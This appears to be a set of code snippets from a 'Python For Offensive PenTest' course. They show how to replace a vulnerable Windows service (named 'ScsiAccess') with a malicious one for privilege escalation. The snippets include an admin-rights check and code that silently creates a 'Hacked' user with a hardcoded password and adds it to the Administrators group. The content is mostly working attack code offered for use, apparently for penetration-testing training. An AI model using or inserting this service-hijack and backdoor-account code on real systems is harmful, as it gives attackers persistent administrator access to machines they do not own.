["```\n# Python For Offensive PenTest\n\n# Backdooring Legitimate Windows Service\n\nimport servicemanager\nimport win32serviceutil\nimport win32service\nimport win32api\n\nimport os\nimport ctypes\n\n...\n\n# Part 1 - initializing : in this section we:-\nif __name__ == '__main__':\n\n    servicemanager.Initialize() # define a listener for win servicemanager\n    servicemanager.PrepareToHostSingle(Service)\n    servicemanager.StartServiceCtrlDispatcher()\n    win32serviceutil.HandleCommandLine(Service) #pass a Service class handler, so whenver we got a signal from the servicemanager we will pass it to the Service class\n\n```", "```\n# Part 2 - Here (in service class) we define the action to do when we got a service manager signal \n\nclass Service(win32serviceutil.ServiceFramework):\n\n    _svc_name_ = 'ScsiAccess' # specify the service name and the display name - note that the name scsiacces is similar to the original one for photodex vulnerable software\n    _svc_display_name_ = 'ScsiAccess'\n\n    def __init__(self, *args): # Initialize ServiceFramework and we define in functions style what to do when we got a service manager signal\n        win32serviceutil.ServiceFramework.__init__(self, *args)\n\n    def sleep(self, sec): # if the service manager signal was pause - then we sleep for an amount of seconds\n        win32api.Sleep(sec*1000, True)\n\n    def SvcDoRun(self): # if the signal was start - then:-\n\n        self.ReportServiceStatus(win32service.SERVICE_START_PENDING) # tell the Service Manager that we are planning to run the service via reporting back a start pending status\n        try:\n            self.ReportServiceStatus(win32service.SERVICE_RUNNING) #tell the Service Manager that we are currently running up the service then call the start\n                                                                   #function (start) if any exception happened, we will call the stop function (SvcStop)\n            self.start() \n\n        except Exception, x:\n            self.SvcStop()\n\n    def SvcStop(self):\n        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING) #tell the Service Manager that we are planning to stop the serivce\n        self.stop()\n        self.ReportServiceStatus(win32service.SERVICE_STOPPED) #tell the Service Manager that we are currently stopping the service\n\n    def start(self):\n        self.runflag=True # mark a service status flag as True and we will Wait in while loop for receiving service stop signal from the service manager\n\n        '''\n        This little code is to double check if we got an admin priv, after replacing our malicious service, thanks to IsUserAnAdmin function\n        https://msdn.microsoft.com/en-us/library/windows/desktop/bb776463(v=vs.85).aspx\n\n        f = open('C:/Users/nonadmin/Desktop/priv.txt','w')\n        if ctypes.windll.shell32.IsUserAnAdmin() == 0:\n            f.write('[-] We are NOT admin! ')\n        else:\n            f.write('[+] We are admin :)')\n        f.close()\n        '''\n\n        while self.runflag: # Wait for service stop signal\n            self.sleep(10)\n\n    def stop(self): # now within the stop function we mark the service status flag as False to break the while loop in the start function\n         self.runflag=False\n```", "```\n# Are we Admin\n\nimport ctypes\n\nif ctypes.windll.shell32.IsUserAnAdmin() == 0:\n    print '[-] We are NOT admin! '\nelse:\n    print '[+] We are admin :) '\n```", "```\n...       \n\n USER = \"Hacked\"\n        GROUP = \"Administrators\"\n        user_info = dict ( # create a user info profile in a dictionary format\n               name = USER,\n               password = \"python_is_my_life\", # Define the password for the 'hacked' username\n               priv = win32netcon.USER_PRIV_USER,\n               home_dir = None,\n               comment = None,\n               flags = win32netcon.UF_SCRIPT,\n               script_path = None\n                )\n\n        user_group_info = dict ( # create a group info profile in a dictionary format\n            domainandname = USER\n           )\n\n        try:\n            win32net.NetUserAdd (None, 1, user_info)\n            win32net.NetLocalGroupAddMembers (None, GROUP, 3, [user_group_info])\n        except Exception, x:\n            pass\n\n...\n```"]